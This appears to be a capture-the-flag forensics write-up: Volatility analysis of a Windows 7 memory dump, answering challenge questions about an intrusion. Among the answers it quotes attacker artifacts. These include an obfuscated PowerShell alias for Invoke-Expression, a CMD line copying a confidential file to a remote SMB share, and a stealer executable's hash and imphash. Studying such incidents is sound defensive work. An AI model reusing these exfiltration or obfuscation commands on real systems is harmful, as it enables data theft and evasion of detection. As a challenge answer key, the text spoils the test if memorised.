qn 1:
```
┌──(alienx㉿alienX)-[~/Desktop/PPP/SHERLOCK/RECOLLECTION]
└─$ volatility -f recollection.bin imageinfo

Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/alienx/Desktop/PPP/SHERLOCK/RECOLLECTION/recollection.bin)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002a3f120L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002a41000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2022-12-19 16:07:30 UTC+0000
     Image local date and time : 2022-12-19 22:07:30 +0600

```
```

profile=Win7SP0x64 (windows 7)

memory dump creation date: 2022-12-19 16:07:30 UTC+0000
```


```
qn: After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?
answer:PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN'' 
```

```
qn:The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?

answer: Invoke-Expression

resource used: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.4
```

```
qn:A CMD command was executed to attempt to exfiltrate a file. What is the full command line?
answer:type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
```

```
qn: The attacker tried to create a readme file. What was the full path of the file?

asnwer:C:\Users\Public\Office\readme.txt
```

```
qn: What was the Host Name of the machine?

answer:
PS C:\Users\user> net users                                                                                             
                                                                                                                        
User accounts for \\USER-PC                                                                                             
                                                                                                                        
-------------------------------------------------------------------------------                                         
Administrator            Guest                    user                                                                  
The command completed successfully.


hostname:USER-PC
total-number of users: 3(administrator,user,guest)
```
```
qn:In the "\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge" folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?

answer:
┌──(alienx㉿alienX)-[~/Desktop/PPP/SHERLOCK/RECOLLECTION]
└─$ volatility -f recollection.bin --profile=Win7SP0x64 filescan | grep -i "passwords.txt"
Volatility Foundation Volatility Framework 2.6
0x000000011fc10070      1      0 R--rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt

we can try to dump the file like this and see what type of content is present in there

┌──(alienx㉿alienX)-[~/Desktop/PPP/SHERLOCK/RECOLLECTION]
└─$ volatility -f recollection.bin --profile=Win7SP0x64 dumpfiles -n -D now -Q 0x000000011fc10070
```

```
qn:A malicious executable file was executed using command. The executable EXE file's name was the hash value of itself. What was the hash value?
answer:
PS C:\Users\user\Downloads> .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
PS C:\Users\user\Downloads>  
```

```
qn:Following the previous question, what is the Imphash of the malicous file you found above?

NB:lmphash(import hash) so here we need first to dump the file itself so as to get the hash

step 1: we need first to know the location of file in the memory dump
┌──(alienx㉿alienX)-[~/Desktop/PPP/SHERLOCK/RECOLLECTION]
└─$ volatility -f recollection.bin --profile=Win7SP0x64 filescan | grep -i "b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe"
Volatility Foundation Volatility Framework 2.6
0x000000011fa45c20     16      0 -W-r-- \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
0x000000011fc1db70      2      0 R--r-d \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe


step 2: after we have know the location we can try to dump the file based with its location
offset:0x000000011fa45c20

┌──(alienx㉿alienX)-[~/Desktop/PPP/SHERLOCK/RECOLLECTION]
└─$ volatility -f recollection.bin --profile=Win7SP0x64 dumpfiles -n -D now1 -Q 0x000000011fa45c20                                              
Volatility Foundation Volatility Framework 2.6
ImageSectionObject 0x11fa45c20   None   \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
DataSectionObject 0x11fa45c20   None   \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe

step 3: lets upload via virustotal and see what this type of file is,

Popular threat label:      trojan.loki/stealer

Threat categories:         trojan ransomware


Family labels:            loki    stealer  smokeloader


answer:lmphash: d3b592cd9481e4f053b5362e22d61595 
```


```
qn:Following the previous question, tell us the date in UTC format when the malicious file was created?

This details can be see from the virustotal(online)
asnwer:

Creation Time:        2022-06-22 11:49:04 UTC
First Submission:     2024-02-08 20:05:01 UTC
Last Submission:      2024-02-26 00:58:02 UTC
Last Analysis:        2024-02-20 15:33:27 UTC
```

```
qn: What was the local IP address of the machine?

In order to get the local machine ip address we can use a plugin=netscan

┌──(alienx㉿alienX)-[~/Desktop/PPP/SHERLOCK/RECOLLECTION]
└─$ volatility -f recollection.bin --profile=Win2008R2SP0x64 netscan
answer:192.168.0.104

0x11e3b2bf0        UDPv4    192.168.0.104:138              *:*                                   4        System         2022-12-19 15:32:47 UTC+0000                                                                                         

```




